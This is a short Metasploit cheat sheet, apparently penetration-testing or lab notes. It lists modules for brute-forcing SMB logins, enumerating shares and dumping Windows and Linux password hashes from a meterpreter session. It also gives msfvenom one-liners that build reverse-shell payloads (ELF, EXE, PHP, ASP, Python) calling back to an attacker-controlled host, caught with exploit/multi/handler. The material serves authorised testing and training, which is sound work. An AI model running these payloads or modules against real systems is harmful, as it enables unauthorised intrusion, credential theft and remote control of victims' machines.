# Metasploit

### Handy Metasploit modules

 Module    | Service  | Description       |
| --------|:--------:|:-----------------|
| smb_login     | SMB      |    Brute-force SMB credentials. |
| smb_version   | SMB      |    Scan for SMB version.        |
| smb_enumshares| SMB      |    Enumerates SMB shares.       |
| post/windows/gather/smart_hashdump  | Windows(any)    | ```run post/windows/gather/smart_hashdump``` - Use this when in meterpreter shell and want to search for Windows hashes.        | 
| post/linux/gather/hashdump   | Linux(any)    | ```run post/linux/gather/hashdump``` - Use this when in meterpreter shell and want to search for Linux hashes.        |
| exploit/multi/handler| Any      |    Use this to catch shell.       |

<details>
<summary>msfvenom</summary>

### Msfvenom Payload Examples

```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf``` - Linux.

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe``` - Windows.

```msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php``` - PHP.

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp``` - ASP.

 ```msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py``` - Python.

Remember to set correct payload in the exploit/multi/handler as well!
 
Refer to "Transfering Files" section in order to see details how to upload these shells.

</details>
